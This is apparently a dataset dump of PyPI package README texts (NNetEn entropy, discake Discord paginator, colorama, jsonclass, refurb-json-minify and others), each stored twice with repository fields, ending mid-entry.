Entropy measures are effective features for time series classification problems. Traditional entropy measures, such as Shannon entropy, use probability distribution function. However, for the effective separation of time series, new entropy estimation methods are required to characterize the chaotic dynamic of the system. Our concept of Neural Network Entropy (NNetEn) is based on the classification of special datasets (MNIST-10 and SARS-CoV-2-RBV1) in relation to the entropy of the time series recorded in the reservoir of the LogNNet neural network. NNetEn estimates the chaotic dynamics of time series in an original way. Based on the NNetEn algorithm, we propose two new classification metrics: R2 Efficiency and Pearson Efficiency. 

## Article
The published article can be found at the link. [Manuscript](https://arxiv.org/abs/2303.17995 ""arxiv.org"")

##### Bibliographic link:

## Dataset
You can separately download the used datasets from the links [MNIST-10](https://yann.lecun.com/exdb/mnist/) and
[SARS-CoV-2-RBV1](https://data.mendeley.com/datasets/8hdnzv23x7)

## Installation

Installation is done from pypi using the following command

```shell
pip install NNetEn
```

## Usage

### Command to create the NNetEn_entropy model
```shell
 from NNetEn import NNetEn_entropy

 NNetEn = NNetEn_entropy(database='D1', mu=1)
```
Arguments:
- database: (default = D1) Select dataset, D1: MNIST, D2 :SARS-CoV-2-RBV1
- mu: (default = 1) Usage fraction of the selected database (0.01 .. 1).

**Output:** The LogNNet neural network is operated using normalized training and test
sets contained in the NNetEn_entropy class

### Command to calculation the NNetEn parameter
```shell
NNetEn.calculation(time_series, epoch=20, method=3, metric='Acc', log=False)
```
Arguments:
- time_series: Input data with a time series in numpy array format.
- epoch: (default = 20) The number of training epochs for the LogNNet neural
network, with a number greater than 0.
- method: (default = 3) One of 6 methods for forming a reservoir matrix from
the time series M1 ... M6.
- metric: (default = 'Acc') 'Acc' - accuracy metric,
                    'R2E' - R2 Efficiency metric,
                    'PE' - Pearson Efficiency metric.
- log: (default = False) Parameter for logging the main data used in the calculation.
Recording is done in log.txt file.

**Output:** Entropy value NNetEn.

","[![License](https://img.shields.io/badge/License-BSD-blue.svg)](https://opensource.org/licenses/BSD-3-Clause)
[![DOI](https://img.shields.io/badge/DOI-arxiv-green)](https://arxiv.org/abs/2303.17995)

# Neural Network Entropy (NNetEn)

Entropy measures are effective features for time series classification problems. Traditional entropy measures, such as Shannon entropy, use probability distribution function. However, for the effective separation of time series, new entropy estimation methods are required to characterize the chaotic dynamic of the system. Our concept of Neural Network Entropy (NNetEn) is based on the classification of special datasets (MNIST-10 and SARS-CoV-2-RBV1) in relation to the entropy of the time series recorded in the reservoir of the LogNNet neural network. NNetEn estimates the chaotic dynamics of time series in an original way. Based on the NNetEn algorithm, we propose two new classification metrics: R2 Efficiency and Pearson Efficiency. 

## Article
The published article can be found at the link. [Manuscript](https://arxiv.org/abs/2303.17995 ""arxiv.org"")

##### Bibliographic link:

## Dataset
You can separately download the used datasets from the links [MNIST-10](https://yann.lecun.com/exdb/mnist/) and
[SARS-CoV-2-RBV1](https://data.mendeley.com/datasets/8hdnzv23x7)

## Installation

Installation is done from pypi using the following command

```shell
pip install NNetEn
```

## Usage

### Command to create the NNetEn_entropy model
```shell
 from NNetEn import NNetEn_entropy

 NNetEn = NNetEn_entropy(database='D1', mu=1)
```
Arguments:
- database: (default = D1) Select dataset, D1: MNIST, D2 :SARS-CoV-2-RBV1
- mu: (default = 1) Usage fraction of the selected database (0.01 .. 1).

**Output:** The LogNNet neural network is operated using normalized training and test
sets contained in the NNetEn_entropy class

### Command to calculation the NNetEn parameter
```shell
NNetEn.calculation(time_series, epoch=20, method=3, metric='Acc', log=False)
```
Arguments:
- time_series: Input data with a time series in numpy array format.
- epoch: (default = 20) The number of training epochs for the LogNNet neural
network, with a number greater than 0.
- method: (default = 3) One of 6 methods for forming a reservoir matrix from
the time series M1 ... M6.
- metric: (default = 'Acc') 'Acc' - accuracy metric,
                    'R2E' - R2 Efficiency metric,
                    'PE' - Pearson Efficiency metric.
- log: (default = False) Parameter for logging the main data used in the calculation.
Recording is done in log.txt file.

**Output:** Entropy value NNetEn.

",izotov93/nneten
mindocr,https://github.com/mindspore-lab/mindocr,15,0,0,,,mindspore-lab/mindocr
discake,https://github.com/lollipop-69/discake/,1,1685,1654,"discake
==========

.. image:: https://discord.com/api/guilds/815886477066108968/embed.png
   :target: https://discord.gg/egvmz5NjSZ
   :alt: Discord server invite
.. image:: https://img.shields.io/pypi/v/discord.py.svg
   :target: https://pypi.python.org/pypi/discord.py
   :alt: PyPI version info
.. image:: https://img.shields.io/pypi/pyversions/discord.py.svg
   :target: https://pypi.python.org/pypi/discord.py
   :alt: PyPI supported Python versions

A discord py util library.

Key Features
-------------

- Button Paginator

Installing
----------

**Python 3.8 or higher is required**


.. code:: sh

    # Linux/macOS
    python3 -m pip install -U discake

    # Windows
    py -3 -m pip install -U discake


Quick Example
--------------

.. code:: py

    import discord
    from discord import Embed, Intents
    from discord.ext import commands
    from discake import Paginator

    class MyBot(comamnds.Bot):
        def __init__(self):
            super().__init__(command_prefix = '!')
            
        async def on_ready(self):
            print('Logged on as', self.user)

    client = MyBot(intents=Intents.default())
    
    @client.command(name = 'paginate', description = 'Pagination using the library')
    async def _paginate(ctx):
        entry_list = []
        for i in range(0,20):
            embed = Embed(description = f'This is the {i}th page')
            entry_list.append(embed)
        paginate_object = Paginator(
                entries = entry_list,
                timeout = 10.0
        )
        await paginate_object.send(ctx)
    
    
    client.run('TOKEN')

Links
------

- `Official Discord Server <https://discord.gg/egvmz5NjSZ>`_
","discake
==========

.. image:: https://discord.com/api/guilds/815886477066108968/embed.png
   :target: https://discord.gg/egvmz5NjSZ
   :alt: Discord server invite
.. image:: https://img.shields.io/pypi/v/discord.py.svg
   :target: https://pypi.python.org/pypi/discord.py
   :alt: PyPI version info
.. image:: https://img.shields.io/pypi/pyversions/discord.py.svg
   :target: https://pypi.python.org/pypi/discord.py
   :alt: PyPI supported Python versions

A discord py util library.

Key Features
-------------

- Button Paginator

Installing
----------

**Python 3.8 or higher is required**


.. code:: sh

    # Linux/macOS
    python3 -m pip install -U discake

    # Windows
    py -3 -m pip install -U discake


Quick Example
--------------

.. code:: py

    import discord
    from discord import Embed, Intents
    from discord.ext import commands
    from discake import Paginator

    class MyBot(comamnds.Bot):
        def __init__(self):
            super().__init__(command_prefix = '!')
            
        async def on_ready(self):
            print('Logged on as', self.user)

    client = MyBot(intents=Intents.default())
    
    @client.command(name = 'paginate', description = 'Pagination using the library')
    async def _paginate(ctx):
        entry_list = []
        for i in range(0,20):
            embed = Embed(description = f'This is the {i}th page')
            entry_list.append(embed)
        paginate_object = Paginator(
                entries = entry_list,
                timeout = 10.0
        )
        await paginate_object.send(ctx)
    
    
    client.run('TOKEN')

Links
------

- `Official Discord Server `_
",lollipop-69/discake
licensing-models,https://github.com/tartley/colorama,1,13715,13644,"
Description du projet
Latest Version Supported Python versions Build Status
Colorama

Makes ANSI escape character sequences (for producing colored terminal text and cursor positioning) work under MS Windows.

PyPI for releases | Github for source | Colorama for enterprise on Tidelift

If you find Colorama useful, please Donate with Paypal to the authors. Thank you!
Installation

Tested on CPython 2.7, 3.7, 3.8, 3.9 and 3.10 and Pypy 2.7 and 3.8.

No requirements other than the standard library.

pip install colorama
# or
conda install -c anaconda colorama

Description

ANSI escape character sequences have long been used to produce colored terminal text and cursor positioning on Unix and Macs. Colorama makes this work on Windows, too, by wrapping stdout, stripping ANSI sequences it finds (which would appear as gobbledygook in the output), and converting them into the appropriate win32 calls to modify the state of the terminal. On other platforms, Colorama does nothing.

This has the upshot of providing a simple cross-platform API for printing colored terminal text from Python, and has the happy side-effect that existing applications or libraries which use ANSI sequences to produce colored output on Linux or Macs can now also work on Windows, simply by calling colorama.just_fix_windows_console() (since v0.4.6) or colorama.init() (all versions, but may have other side-effects â€“ see below).

An alternative approach is to install ansi.sys on Windows machines, which provides the same behaviour for all applications running in terminals. Colorama is intended for situations where that isnâ€™t easy (e.g., maybe your app doesnâ€™t have an installer.)

Demo scripts in the source code repository print some colored text using ANSI sequences. Compare their output under Gnome-terminalâ€™s built in ANSI handling, versus on Windows Command-Prompt using Colorama:
ANSI sequences on Ubuntu under gnome-terminal. Same ANSI sequences on Windows, using Colorama.

These screenshots show that, on Windows, Colorama does not support ANSI â€˜dim textâ€™; it looks the same as â€˜normal textâ€™.
Usage
Initialisation

If the only thing you want from Colorama is to get ANSI escapes to work on Windows, then run:

from colorama import just_fix_windows_console
just_fix_windows_console()

If youâ€™re on a recent version of Windows 10 or better, and your stdout/stderr are pointing to a Windows console, then this will flip the magic configuration switch to enable Windowsâ€™ built-in ANSI support.

If youâ€™re on an older version of Windows, and your stdout/stderr are pointing to a Windows console, then this will wrap sys.stdout and/or sys.stderr in a magic file object that intercepts ANSI escape sequences and issues the appropriate Win32 calls to emulate them.

In all other circumstances, it does nothing whatsoever. Basically the idea is that this makes Windows act like Unix with respect to ANSI escape handling.

Itâ€™s safe to call this function multiple times. Itâ€™s safe to call this function on non-Windows platforms, but it wonâ€™t do anything. Itâ€™s safe to call this function when one or both of your stdout/stderr are redirected to a file â€“ it wonâ€™t do anything to those streams.

Alternatively, you can use the older interface with more features (but also more potential footguns):

from colorama import init
init()

This does the same thing as just_fix_windows_console, except for the following differences:

    Itâ€™s not safe to call init multiple times; you can end up with multiple layers of wrapping and broken ANSI support.

    Colorama will apply a heuristic to guess whether stdout/stderr support ANSI, and if it thinks they donâ€™t, then it will wrap sys.stdout and sys.stderr in a magic file object that strips out ANSI escape sequences before printing them. This happens on all platforms, and can be convenient if you want to write your code to emit ANSI escape sequences unconditionally, and let Colorama decide whether they should actually be output. But note that Coloramaâ€™s heuristic is not particularly clever.

    init also accepts explicit keyword args to enable/disable various functionality â€“ see below.

To stop using Colorama before your program exits, simply call deinit(). This will restore stdout and stderr to their original values, so that Colorama is disabled. To resume using Colorama again, call reinit(); it is cheaper than calling init() again (but does the same thing).

Most users should depend on colorama >= 0.4.6, and use just_fix_windows_console. The old init interface will be supported indefinitely for backwards compatibility, but we donâ€™t plan to fix any issues with it, also for backwards compatibility.
Colored Output

Cross-platform printing of colored text can then be done using Coloramaâ€™s constant shorthand for ANSI escape sequences. These are deliberately rudimentary, see below.

from colorama import Fore, Back, Style
print(Fore.RED + 'some red text')
print(Back.GREEN + 'and with a green background')
print(Style.DIM + 'and in dim text')
print(Style.RESET_ALL)
print('back to normal now')

â€¦or simply by manually printing ANSI sequences from your own code:

print('\033[31m' + 'some red text')
print('\033[39m') # and reset to default color

â€¦or, Colorama can be used in conjunction with existing ANSI libraries such as the venerable Termcolor the fabulous Blessings, or the incredible _Rich.

If you wish Coloramaâ€™s Fore, Back and Style constants were more capable, then consider using one of the above highly capable libraries to generate colors, etc, and use Colorama just for its primary purpose: to convert those ANSI sequences to also work on Windows:

SIMILARLY, do not send PRs adding the generation of new ANSI types to Colorama. We are only interested in converting ANSI codes to win32 API calls, not shortcuts like the above to generate ANSI characters.

from colorama import just_fix_windows_console
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
just_fix_windows_console()

# then use Termcolor for all colored text output
print(colored('Hello, World!', 'green', 'on_red'))

Available formatting constants are:

Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Style: DIM, NORMAL, BRIGHT, RESET_ALL

Style.RESET_ALL resets foreground, background, and brightness. Colorama will perform this reset automatically on program exit.

These are fairly well supported, but not part of the standard:

Fore: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX
Back: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX

Cursor Positioning

ANSI codes to reposition the cursor are supported. See demos/demo06.py for an example of how to generate them.
Init Keyword Args

init() accepts some **kwargs to override default behaviour.

init(autoreset=False):

    If you find yourself repeatedly sending reset sequences to turn off color changes at the end of every print, then init(autoreset=True) will automate that:

    from colorama import init
    init(autoreset=True)
    print(Fore.RED + 'some red text')
    print('automatically back to default color again')

init(strip=None):

    Pass True or False to override whether ANSI codes should be stripped from the output. The default behaviour is to strip if on Windows or if output is redirected (not a tty).
init(convert=None):

    Pass True or False to override whether to convert ANSI codes in the output into win32 calls. The default behaviour is to convert if on Windows and output is to a tty (terminal).
init(wrap=True):

    On Windows, Colorama works by replacing sys.stdout and sys.stderr with proxy objects, which override the .write() method to do their work. If this wrapping causes you problems, then this can be disabled by passing init(wrap=False). The default behaviour is to wrap if autoreset or strip or convert are True.

    When wrapping is disabled, colored printing on non-Windows platforms will continue to work as normal. To do cross-platform colored output, you can use Coloramaâ€™s AnsiToWin32 proxy directly:

    import sys
    from colorama import init, AnsiToWin32
    init(wrap=False)
    stream = AnsiToWin32(sys.stderr).stream

    # Python 2
    print >>stream, Fore.BLUE + 'blue text on stderr'

    # Python 3
    print(Fore.BLUE + 'blue text on stderr', file=stream)

Recognised ANSI Sequences

ANSI sequences generally take the form:

ESC [ <param> ; <param> ... <command>

Where <param> is an integer, and <command> is a single letter. Zero or more params are passed to a <command>. If no params are passed, it is generally synonymous with passing a single zero. No spaces exist in the sequence; they have been inserted here simply to read more easily.

The only ANSI sequences that Colorama converts into win32 calls are:

ESC [ 0 m       # reset all (colors and brightness)
ESC [ 1 m       # bright
ESC [ 2 m       # dim (looks same as normal brightness)
ESC [ 22 m      # normal brightness

# FOREGROUND:
ESC [ 30 m      # black
ESC [ 31 m      # red
ESC [ 32 m      # green
ESC [ 33 m      # yellow
ESC [ 34 m      # blue
ESC [ 35 m      # magenta
ESC [ 36 m      # cyan
ESC [ 37 m      # white
ESC [ 39 m      # reset

# BACKGROUND
ESC [ 40 m      # black
ESC [ 41 m      # red
ESC [ 42 m      # green
ESC [ 43 m      # yellow
ESC [ 44 m      # blue
ESC [ 45 m      # magenta
ESC [ 46 m      # cyan
ESC [ 47 m      # white
ESC [ 49 m      # reset

# cursor positioning
ESC [ y;x H     # position cursor at x across, y down
ESC [ y;x f     # position cursor at x across, y down
ESC [ n A       # move cursor n lines up
ESC [ n B       # move cursor n lines down
ESC [ n C       # move cursor n characters forward
ESC [ n D       # move cursor n characters backward

# clear the screen
ESC [ mode J    # clear the screen

# clear the line
ESC [ mode K    # clear the line

Multiple numeric params to the 'm' command can be combined into a single sequence:

ESC [ 36 ; 45 ; 1 m     # bright cyan text on magenta background

All other ANSI sequences of the form ESC [ <param> ; <param> ... <command> are silently stripped from the output on Windows.

Any other form of ANSI sequence, such as single-character codes or alternative initial characters, are not recognised or stripped. It would be cool to add them though. Let me know if it would be useful for you, via the Issues on GitHub.
Status & Known Problems

Iâ€™ve personally only tested it on Windows XP (CMD, Console2), Ubuntu (gnome-terminal, xterm), and OS X.

Some valid ANSI sequences arenâ€™t recognised.

If youâ€™re hacking on the code, see README-hacking.md. ESPECIALLY, see the explanation there of why we do not want PRs that allow Colorama to generate new types of ANSI codes.

See outstanding issues and wish-list: https://github.com/tartley/colorama/issues

If anything doesnâ€™t work for you, or doesnâ€™t do what you expected or hoped for, Iâ€™d love to hear about it on that issues list, would be delighted by patches, and would be happy to grant commit access to anyone who submits a working patch or two.
License

Copyright Jonathan Hartley & Arnon Yaari, 2013-2020. BSD 3-Clause license; see LICENSE file.
Professional support

Tidelift
	

Professional support for colorama is available as part of the Tidelift Subscription. Tidelift gives software development teams a single source for purchasing and maintaining their software, with professional grade assurances from the experts who know it best, while seamlessly integrating with existing tools.
Thanks

See the CHANGELOG for more thanks!

    Marc Schlaich (schlamar) for a setup.py fix for Python2.5.

    Marc Abramowitz, reported & fixed a crash on exit with closed stdout, providing a solution to issue #7â€™s setuptools/distutils debate, and other fixes.

    User â€˜eryksunâ€™, for guidance on correctly instantiating ctypes.windll.

    Matthew McCormick for politely pointing out a longstanding crash on non-Win.

    Ben Hoyt, for a magnificent fix under 64-bit Windows.

    Jesse at Empty Square for submitting a fix for examples in the README.

    User â€˜jamesspâ€™, an observant documentation fix for cursor positioning.

    User â€˜vaal1239â€™, Dave Mckee & Lackner Kristof for a tiny but much-needed Win7 fix.

    Julien Stuyck, for wisely suggesting Python3 compatible updates to README.

    Daniel Griffith for multiple fabulous patches.

    Oscar Lesta for a valuable fix to stop ANSI chars being sent to non-tty output.

    Roger Binns, for many suggestions, valuable feedback, & bug reports.

    Tim Golden for thought and much appreciated feedback on the initial idea.

    User â€˜Zearinâ€™ for updates to the README file.

    John Szakmeister for adding support for light colors

    Charles Merriam for adding documentation to demos

    Jurko for a fix on 64-bit Windows CPython2.5 w/o ctypes

    Florian Bruhin for a fix when stdout or stderr are None

    Thomas Weininger for fixing ValueError on Windows

    Remi Rampin for better Github integration and fixes to the README file

    Simeon Visser for closing a file handle using â€˜withâ€™ and updating classifiers to include Python 3.3 and 3.4

    Andy Neff for fixing RESET of LIGHT_EX colors.

    Jonathan Hartley for the initial idea and implementation.

","
Description du projet
Latest Version Supported Python versions Build Status
Colorama

Makes ANSI escape character sequences (for producing colored terminal text and cursor positioning) work under MS Windows.

PyPI for releases | Github for source | Colorama for enterprise on Tidelift

If you find Colorama useful, please Donate with Paypal to the authors. Thank you!
Installation

Tested on CPython 2.7, 3.7, 3.8, 3.9 and 3.10 and Pypy 2.7 and 3.8.

No requirements other than the standard library.

pip install colorama
# or
conda install -c anaconda colorama

Description

ANSI escape character sequences have long been used to produce colored terminal text and cursor positioning on Unix and Macs. Colorama makes this work on Windows, too, by wrapping stdout, stripping ANSI sequences it finds (which would appear as gobbledygook in the output), and converting them into the appropriate win32 calls to modify the state of the terminal. On other platforms, Colorama does nothing.

This has the upshot of providing a simple cross-platform API for printing colored terminal text from Python, and has the happy side-effect that existing applications or libraries which use ANSI sequences to produce colored output on Linux or Macs can now also work on Windows, simply by calling colorama.just_fix_windows_console() (since v0.4.6) or colorama.init() (all versions, but may have other side-effects â€“ see below).

An alternative approach is to install ansi.sys on Windows machines, which provides the same behaviour for all applications running in terminals. Colorama is intended for situations where that isnâ€™t easy (e.g., maybe your app doesnâ€™t have an installer.)

Demo scripts in the source code repository print some colored text using ANSI sequences. Compare their output under Gnome-terminalâ€™s built in ANSI handling, versus on Windows Command-Prompt using Colorama:
ANSI sequences on Ubuntu under gnome-terminal. Same ANSI sequences on Windows, using Colorama.

These screenshots show that, on Windows, Colorama does not support ANSI â€˜dim textâ€™; it looks the same as â€˜normal textâ€™.
Usage
Initialisation

If the only thing you want from Colorama is to get ANSI escapes to work on Windows, then run:

from colorama import just_fix_windows_console
just_fix_windows_console()

If youâ€™re on a recent version of Windows 10 or better, and your stdout/stderr are pointing to a Windows console, then this will flip the magic configuration switch to enable Windowsâ€™ built-in ANSI support.

If youâ€™re on an older version of Windows, and your stdout/stderr are pointing to a Windows console, then this will wrap sys.stdout and/or sys.stderr in a magic file object that intercepts ANSI escape sequences and issues the appropriate Win32 calls to emulate them.

In all other circumstances, it does nothing whatsoever. Basically the idea is that this makes Windows act like Unix with respect to ANSI escape handling.

Itâ€™s safe to call this function multiple times. Itâ€™s safe to call this function on non-Windows platforms, but it wonâ€™t do anything. Itâ€™s safe to call this function when one or both of your stdout/stderr are redirected to a file â€“ it wonâ€™t do anything to those streams.

Alternatively, you can use the older interface with more features (but also more potential footguns):

from colorama import init
init()

This does the same thing as just_fix_windows_console, except for the following differences:

    Itâ€™s not safe to call init multiple times; you can end up with multiple layers of wrapping and broken ANSI support.

    Colorama will apply a heuristic to guess whether stdout/stderr support ANSI, and if it thinks they donâ€™t, then it will wrap sys.stdout and sys.stderr in a magic file object that strips out ANSI escape sequences before printing them. This happens on all platforms, and can be convenient if you want to write your code to emit ANSI escape sequences unconditionally, and let Colorama decide whether they should actually be output. But note that Coloramaâ€™s heuristic is not particularly clever.

    init also accepts explicit keyword args to enable/disable various functionality â€“ see below.

To stop using Colorama before your program exits, simply call deinit(). This will restore stdout and stderr to their original values, so that Colorama is disabled. To resume using Colorama again, call reinit(); it is cheaper than calling init() again (but does the same thing).

Most users should depend on colorama >= 0.4.6, and use just_fix_windows_console. The old init interface will be supported indefinitely for backwards compatibility, but we donâ€™t plan to fix any issues with it, also for backwards compatibility.
Colored Output

Cross-platform printing of colored text can then be done using Coloramaâ€™s constant shorthand for ANSI escape sequences. These are deliberately rudimentary, see below.

from colorama import Fore, Back, Style
print(Fore.RED + 'some red text')
print(Back.GREEN + 'and with a green background')
print(Style.DIM + 'and in dim text')
print(Style.RESET_ALL)
print('back to normal now')

â€¦or simply by manually printing ANSI sequences from your own code:

print('\033[31m' + 'some red text')
print('\033[39m') # and reset to default color

â€¦or, Colorama can be used in conjunction with existing ANSI libraries such as the venerable Termcolor the fabulous Blessings, or the incredible _Rich.

If you wish Coloramaâ€™s Fore, Back and Style constants were more capable, then consider using one of the above highly capable libraries to generate colors, etc, and use Colorama just for its primary purpose: to convert those ANSI sequences to also work on Windows:

SIMILARLY, do not send PRs adding the generation of new ANSI types to Colorama. We are only interested in converting ANSI codes to win32 API calls, not shortcuts like the above to generate ANSI characters.

from colorama import just_fix_windows_console
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
just_fix_windows_console()

# then use Termcolor for all colored text output
print(colored('Hello, World!', 'green', 'on_red'))

Available formatting constants are:

Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Style: DIM, NORMAL, BRIGHT, RESET_ALL

Style.RESET_ALL resets foreground, background, and brightness. Colorama will perform this reset automatically on program exit.

These are fairly well supported, but not part of the standard:

Fore: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX
Back: LIGHTBLACK_EX, LIGHTRED_EX, LIGHTGREEN_EX, LIGHTYELLOW_EX, LIGHTBLUE_EX, LIGHTMAGENTA_EX, LIGHTCYAN_EX, LIGHTWHITE_EX

Cursor Positioning

ANSI codes to reposition the cursor are supported. See demos/demo06.py for an example of how to generate them.
Init Keyword Args

init() accepts some **kwargs to override default behaviour.

init(autoreset=False):

    If you find yourself repeatedly sending reset sequences to turn off color changes at the end of every print, then init(autoreset=True) will automate that:

    from colorama import init
    init(autoreset=True)
    print(Fore.RED + 'some red text')
    print('automatically back to default color again')

init(strip=None):

    Pass True or False to override whether ANSI codes should be stripped from the output. The default behaviour is to strip if on Windows or if output is redirected (not a tty).
init(convert=None):

    Pass True or False to override whether to convert ANSI codes in the output into win32 calls. The default behaviour is to convert if on Windows and output is to a tty (terminal).
init(wrap=True):

    On Windows, Colorama works by replacing sys.stdout and sys.stderr with proxy objects, which override the .write() method to do their work. If this wrapping causes you problems, then this can be disabled by passing init(wrap=False). The default behaviour is to wrap if autoreset or strip or convert are True.

    When wrapping is disabled, colored printing on non-Windows platforms will continue to work as normal. To do cross-platform colored output, you can use Coloramaâ€™s AnsiToWin32 proxy directly:

    import sys
    from colorama import init, AnsiToWin32
    init(wrap=False)
    stream = AnsiToWin32(sys.stderr).stream

    # Python 2
    print >>stream, Fore.BLUE + 'blue text on stderr'

    # Python 3
    print(Fore.BLUE + 'blue text on stderr', file=stream)

Recognised ANSI Sequences

ANSI sequences generally take the form:

ESC [  ;  ... 

Where  is an integer, and  is a single letter. Zero or more params are passed to a . If no params are passed, it is generally synonymous with passing a single zero. No spaces exist in the sequence; they have been inserted here simply to read more easily.

The only ANSI sequences that Colorama converts into win32 calls are:

ESC [ 0 m       # reset all (colors and brightness)
ESC [ 1 m       # bright
ESC [ 2 m       # dim (looks same as normal brightness)
ESC [ 22 m      # normal brightness

# FOREGROUND:
ESC [ 30 m      # black
ESC [ 31 m      # red
ESC [ 32 m      # green
ESC [ 33 m      # yellow
ESC [ 34 m      # blue
ESC [ 35 m      # magenta
ESC [ 36 m      # cyan
ESC [ 37 m      # white
ESC [ 39 m      # reset

# BACKGROUND
ESC [ 40 m      # black
ESC [ 41 m      # red
ESC [ 42 m      # green
ESC [ 43 m      # yellow
ESC [ 44 m      # blue
ESC [ 45 m      # magenta
ESC [ 46 m      # cyan
ESC [ 47 m      # white
ESC [ 49 m      # reset

# cursor positioning
ESC [ y;x H     # position cursor at x across, y down
ESC [ y;x f     # position cursor at x across, y down
ESC [ n A       # move cursor n lines up
ESC [ n B       # move cursor n lines down
ESC [ n C       # move cursor n characters forward
ESC [ n D       # move cursor n characters backward

# clear the screen
ESC [ mode J    # clear the screen

# clear the line
ESC [ mode K    # clear the line

Multiple numeric params to the 'm' command can be combined into a single sequence:

ESC [ 36 ; 45 ; 1 m     # bright cyan text on magenta background

All other ANSI sequences of the form ESC [  ;  ...  are silently stripped from the output on Windows.

Any other form of ANSI sequence, such as single-character codes or alternative initial characters, are not recognised or stripped. It would be cool to add them though. Let me know if it would be useful for you, via the Issues on GitHub.
Status & Known Problems

Iâ€™ve personally only tested it on Windows XP (CMD, Console2), Ubuntu (gnome-terminal, xterm), and OS X.

Some valid ANSI sequences arenâ€™t recognised.

If youâ€™re hacking on the code, see README-hacking.md. ESPECIALLY, see the explanation there of why we do not want PRs that allow Colorama to generate new types of ANSI codes.

See outstanding issues and wish-list: https://github.com/tartley/colorama/issues

If anything doesnâ€™t work for you, or doesnâ€™t do what you expected or hoped for, Iâ€™d love to hear about it on that issues list, would be delighted by patches, and would be happy to grant commit access to anyone who submits a working patch or two.
License

Copyright Jonathan Hartley & Arnon Yaari, 2013-2020. BSD 3-Clause license; see LICENSE file.
Professional support

Tidelift
	

Professional support for colorama is available as part of the Tidelift Subscription. Tidelift gives software development teams a single source for purchasing and maintaining their software, with professional grade assurances from the experts who know it best, while seamlessly integrating with existing tools.
Thanks

See the CHANGELOG for more thanks!

    Marc Schlaich (schlamar) for a setup.py fix for Python2.5.

    Marc Abramowitz, reported & fixed a crash on exit with closed stdout, providing a solution to issue #7â€™s setuptools/distutils debate, and other fixes.

    User â€˜eryksunâ€™, for guidance on correctly instantiating ctypes.windll.

    Matthew McCormick for politely pointing out a longstanding crash on non-Win.

    Ben Hoyt, for a magnificent fix under 64-bit Windows.

    Jesse at Empty Square for submitting a fix for examples in the README.

    User â€˜jamesspâ€™, an observant documentation fix for cursor positioning.

    User â€˜vaal1239â€™, Dave Mckee & Lackner Kristof for a tiny but much-needed Win7 fix.

    Julien Stuyck, for wisely suggesting Python3 compatible updates to README.

    Daniel Griffith for multiple fabulous patches.

    Oscar Lesta for a valuable fix to stop ANSI chars being sent to non-tty output.

    Roger Binns, for many suggestions, valuable feedback, & bug reports.

    Tim Golden for thought and much appreciated feedback on the initial idea.

    User â€˜Zearinâ€™ for updates to the README file.

    John Szakmeister for adding support for light colors

    Charles Merriam for adding documentation to demos

    Jurko for a fix on 64-bit Windows CPython2.5 w/o ctypes

    Florian Bruhin for a fix when stdout or stderr are None

    Thomas Weininger for fixing ValueError on Windows

    Remi Rampin for better Github integration and fixes to the README file

    Simeon Visser for closing a file handle using â€˜withâ€™ and updating classifiers to include Python 3.3 and 3.4

    Andy Neff for fixing RESET of LIGHT_EX colors.

    Jonathan Hartley for the initial idea and implementation.

",tartley/colorama
code-eval-score,https://github.com/Lizhmq/code-eval-score,0,69,69,"Automated evaluation of generated code based on CodeBERT and CodeT5.
","Automated evaluation of generated code based on CodeBERT and CodeT5.
",lizhmq/code-eval-score
supopnumtools,https://github.com/IOGS-Digital-Methods/SupOpNumTools,0,24,24,"# SupOpNumTools
Package
","# SupOpNumTools
Package
",iogs-digital-methods/supopnumtools
jsonclass,https://github.com/soundagain2/jsonclass,0,385,385,"# JSONClass

Convert json to object and back in Python. 

## Example

    from jsonclass import JSONClass
  
  
    class Test(JSONClass):
        field: str
  
  
    obj = Test()
    obj.field = ""value""
    assert obj.to_json()[""field""] == ""value""
  
    obj = JSONClass({""__json_class__"": ""Test"", ""field"": ""value2""})
    assert isinstance(obj, Test)
    assert obj.field = ""value2""
","# JSONClass

Convert json to object and back in Python. 

## Example

    from jsonclass import JSONClass
  
  
    class Test(JSONClass):
        field: str
  
  
    obj = Test()
    obj.field = ""value""
    assert obj.to_json()[""field""] == ""value""
  
    obj = JSONClass({""__json_class__"": ""Test"", ""field"": ""value2""})
    assert isinstance(obj, Test)
    assert obj.field = ""value2""
",soundagain2/jsonclass
refurb-json-minify,https://github.com/dosisod/refurb-json-minify,1,1547,1547,"# refurb-json-minify

A small plugin for [Refurb](https://github.com/dosisod/refurb) aimed at minifying JSON outputs.

## Why is this important?

JSON is a widely used format for data exchange, whether that be APIs talking over the
internet, metadata being stored in a database, or config files stored on a user's
filesystem. Although CPU and harddrive space is getting cheaper and cheaper, it isn't
free, and being mindful of resources can lead to faster and more efficient programs.

## Supported Checks

### `JMIN100`: Use `separators`

The [`json.dump`](https://docs.python.org/3/library/json.html#json.dump) and
[`json.dumps`](https://docs.python.org/3/library/json.html#json.dumps) functions
allow for an optional `separators` field which specifies what characters to use
for colons (`:`) and commas (`,`) in the JSON output. Normally there is whitespace
after these characters, but you can change this to use a more compact format.

Here is a simple example comparing the output of `json.dumps()` with and without
`separators` specified:

```python
import json

data = {
  ""hello"": ""world"",
  ""numbers"": [1, 2, 3, 4],
}

a = json.dumps(data)
b = json.dumps(data, separators=("","", "":""))

print(f""{len(a)=}"", f""{len(b)=}"")
```

When we run this, we get:

```
len(a)=43 len(b)=37
```

By reducing the whitespace in our JSON output we where able to shave off 6 bytes, or about
16% in this example.

### `JMIN101`: Don't `json.dump()` integers

Don't call `json.dump()` on integers, use `str()` instead since they share the
same representation.
","# refurb-json-minify

A small plugin for [Refurb](https://github.com/dosisod/refurb) aimed at minifying JSON outputs.

## Why is this important?

